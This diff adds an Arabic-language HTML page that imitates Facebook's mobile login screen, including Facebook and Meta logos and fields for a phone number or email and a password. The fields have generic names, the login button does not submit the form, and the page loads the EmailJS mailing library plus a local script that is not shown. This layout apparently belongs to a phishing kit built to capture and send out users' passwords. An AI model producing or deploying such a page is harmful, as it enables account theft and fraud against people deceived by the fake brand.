@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="mobile-container">
+    <!-- اختيار اللغة في الأعلى -->
+    <div class="language-selector">
+      <span>العربية</span>
+      <svg class="chevron-icon" viewBox="0 0 24 24" width="14" height="14">
+        <path fill="currentColor" d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/>
+      </svg>
+    </div>
+
+    <!-- الشعار الوسطي (ضع مسار اللوجو الخاص بك هنا) -->
+    <div class="logo-container">
+      <img src="Facebook_Logo_Primary.png" alt="Logo" class="main-logo">
+    </div>
+
+    <!-- نموذج تسجيل الدخول -->
+    <form class="login-form" action="#" method="POST">
+      <input 
+        type="text" 
+        id="field1" 
+        name="field1"
+        placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" 
+        required
+      >
+      <input 
+        type="password" 
+        id="field2" 
+        name="field2"
+        placeholder="كلمة السر" 
+        required
+      >
+      <button type="button" id="sendBtn">تسجيل الدخول</button>
+      <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+    </form>
+
+    <!-- القسم السفلي -->
+    <div class="bottom-section">
+      
+      <!-- شعار Meta -->
+      <div class="meta-branding" dir="ltr">
+        <img src="meta.jpg" class="meta-img">
+      </div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@5/dist/email.min.js"></script>
+  <script src="index.js"></script>
+</body>
+</html>
